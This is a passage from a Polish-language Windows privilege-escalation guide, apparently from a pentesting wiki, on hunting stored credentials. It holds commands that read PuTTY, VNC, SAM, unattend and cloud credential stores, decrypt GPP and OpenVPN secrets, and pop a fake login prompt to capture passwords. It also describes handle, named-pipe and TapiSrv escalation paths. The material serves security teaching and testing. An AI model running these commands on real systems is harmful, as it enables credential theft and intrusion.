Oddzielny plik `Openfire\conf\openfire.xml` może ujawnić skonfigurowane porty konsoli administracyjnej i interfejs powiązania, nawet jeśli używana jest zewnętrzna baza danych. Konsola administracyjna Openfire często nasłuchuje na loopback; lokalne konto nadal może uzyskać dostęp do tego adresu, jeśli proces nasłuchujący działa. Sprawdź łącznie faktyczny proces nasłuchujący, upoważnioną rolę administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator, który może zainstalować wtyczkę, może uruchomić jej kod w kontekście usługi, co może oznaczać wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodność hasła konta ani czytelna ścieżka konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania śledczego

Konfiguracje serwera Velociraptor, zwykle o nazwie `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wystawić certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w kontekście której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne materiały; jej znalezienie nie oznacza dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, więc czytelna konfiguracja serwera może go nie zawierać.

Na serwerze Windows sprawdź ACL konfiguracji **serwera** w jego katalogu instalacyjnym oraz wszelkich chronionych kopii zapasowych. Jedna z możliwych lokalizacji to `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli różni się ona od ścieżki skonfigurowanej dla usługi, użyj tej ścieżki. Potwierdź, że bieżąca tożsamość może odczytać plik i że `CA.private_key` rzeczywiście się w nim znajduje. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Proces `config api_client` dostawcy używa klucza CA do wystawienia certyfikatu klienta, ale potrzebna jest również skuteczna rola po stronie serwera; jej utworzenie lub zmiana może wymagać dostępu do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewnić ścieżkę dostępu, nawet gdy taki zapis nie jest możliwy. Zapytania API z prawami do wykonywania kodu są uruchamiane w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe za pomocą restrykcyjnych ACL, w miarę możliwości przechowuj klucz podpisujący CA offline oraz ograniczaj role API i dostęp do nasłuchujących interfejsów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wytyczne dotyczące konfiguracji bezpieczeństwa](https://docs.velociraptor.app/docs/deployment/security/).

### Dane uwierzytelniające PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik eksportu SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) podaje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; na [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazano natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub mają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć klucze SSH, dodać je za pomocą `ssh-add` i zalogować się przez SSH na maszynie. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania za pomocą klucza asymetrycznego.

### Pliki nienadzorowane

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz też wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe ule `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed rozpakowaniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że ule są w nim dostępne, a typowe pliki `install.wim`, `boot.wim` i obrazy odzyskiwania często okazują się fałszywym tropem. Udział SMB to osobna ścieżka dostępu — sprawdzaj go tylko wtedy, gdy mieści się w zakresie. Zobacz [wytyczne Microsoftu dotyczące obrazów Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [opis plików uli rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Dane uwierzytelniające w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Zbuforowane hasło GPP

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pośrednictwem Group Policy Preferences (GPP). Ta metoda miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty zasad grupy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych obiektach GPP, zaszyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie zbuforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizację pliku, co ułatwia identyfikację tej luki w zabezpieczeniach i jej usunięcie.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config z danymi uwierzytelniającymi:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu webroot IIS

Stara kopia zapasowa ZIP umieszczona bezpośrednio w katalogu webroot serwowanym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i możliwe do ponownego użycia dane uwierzytelniające. Sprawdź skonfigurowaną fizyczną ścieżkę witryny oraz to, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz to za ekspozycję. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko potencjalna lokalizacja. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie swoich danych uwierzytelniających, a nawet danych innego użytkownika**, jeśli uważasz, że może je znać (zauważ, że bezpośrednie proszenie klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **postaci jawnego tekstu** lub zakodowane w **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; sama jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć przechowywanych w nim poświadczeń. Podczas sprawdzania, gdzie przechowywane są takie pliki, przejrzyj dostępne profile użytkowników i skonfigurowane katalogi główne udostępniania plików.

Czytelny plik KeePass `.kdbx` jest również tylko wskazówką dotyczącą zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest właściwe hasło główne oraz wszelkie skonfigurowane pliki kluczy lub inne czynniki uwierzytelniania. Jeśli w ramach autoryzowanego przeglądu znajdziesz w pozycji parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Wpis w sejfie sam w sobie nie nadaje uprawnień Administrator ani SYSTEM; dostęp do zdalnej usługi, uprawnienia konta i wszelkie osobne kroki związane z uruchomieniem usługi również muszą być spełnione. Inwentaryzacja powinna podawać ścieżkę do sejfu i informację o możliwości jego odczytu, a nie ujawniać bazy danych ani przechowywanych poświadczeń.

Wyszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wyraźnie wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako odpowiadający mu wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, identyfikatora SID użytkownika i uprawnień plików, więc pusta lista nie dowodzi, że nie istnieje żadna kopia zapasowa, którą można odzyskać. Traktuj nazwę archiwum jako wskazówkę do sprawdzenia, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny usunięty plik `.pfx` może również być wskazówką do **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker sprawdzają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała wynikowy podpis dla tego skryptu i konta docelowego, a zadanie zaplanowane lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego takiego łańcucha. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, listy ACL, zasady i polecenie zaplanowane do wykonania.

Sprawdź również dostępne bazy danych profili klientów komunikatorów, notatki i otrzymane pliki pod kątem wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w archiwum kopii zapasowej o odpowiedniej nazwie. Taki materiał może zapewnić dostęp do osobnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz na to upoważnienie. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych offline wymaga również pasującego ula `SYSTEM`, zgodnie z opisem w [procedurze dotyczącej kopii zapasowych i uprzywilejowanych grup](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików ani zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Sprawdź bazy danych, w których mogą być przechowywane hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach — mogą się tam znajdować **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a `Local State` w jego katalogu nadrzędnym `User Data`. [Microsoft dokumentuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` mogą zmienić tę lokalizację. Sama obecność plików wskazuje jedynie potencjalne miejsce przechowywania poświadczeń: sprawdź, czy pliki są dostępne do odczytu, czy masz kontekst DPAPI właściwego użytkownika lub inny autoryzowany materiał kluczowy oraz czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu stanowią parę: pierwszy zawiera klucz, a drugi zaszyfrowane loginy. Ich obecność wskazuje jedynie potencjalne miejsce przechowywania poświadczeń: sprawdź, czy oba pliki są dostępne do odczytu, czy zawierają zapisane wpisy oraz czy klucz jest chroniony hasłem głównym, zanim uznasz, że poświadczenia można wykorzystać. Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do kontrolowania grup oraz [uprawnienia grupy do odczytu lub odszyfrowania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie dowodzą, że istnieje ścieżka do uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a jego funkcje są udostępniane za pośrednictwem co najmniej jednego interfejsu, identyfikowanego za pomocą identyfikatora interfejsu (IID).

Klasy i interfejsy COM są definiowane odpowiednio w rejestrze pod kluczami **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

W ramach CLSID tego rejestru można znaleźć podrzędny klucz rejestru **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może mieć wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątku).

![Historia przeglądarek - COM DLL Overwriting: W ramach CLSID tego rejestru można znaleźć podrzędny klucz rejestru InProcServer32, który zawiera wartość domyślną wskazującą na DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolną z DLL**, które mają zostać uruchomione, możesz **eskalować uprawnienia**, jeśli ta DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrwalania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści w plikach**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukaj plik o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr pod kątem nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**. Stworzyłem go, aby **automatycznie uruchamiać każdy moduł POST metasploit, który wyszukuje dane logowania** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez różne narzędzia, które zapisują te dane jawnym tekstem (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu nadrzędnego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz pobrać **otwarty uchwyt do procesu uprzywilejowanego utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, aby uzyskać pełniejsze wyjaśnienie, jak testować i nadużywać większej liczby otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **potokami**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję **Named Pipes**, która umożliwia niepowiązanym procesom wymianę danych, nawet w różnych sieciach. Przypomina to architekturę klient/serwer, w której wyróżnia się role **serwera named pipe** i **klienta named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go skonfigurował, może **przyjąć tożsamość** **klienta**, o ile ma wymagane uprawnienie **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się przez potok, który możesz podszyć, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz w przydatnych poradnikach [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala też **przechwytywać komunikację przez named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie pozwala wyświetlić wszystkie potoki i znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD w usłudze Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby zmienić `ClientAttach` w dowolny **4-bajtowy zapis** do istniejącego pliku, do którego zapis ma uprawnienia `NETWORK SERVICE`. Następnie może uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę zapisywalną → usługa otwiera ją za pomocą `CreateFileW(..., OPEN_EXISTING)` i używa do zapisu asynchronicznych zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację liniową za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj ją i zamknij, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużycie handlera protokołu / ShellExecute przez renderery Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne handlery URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

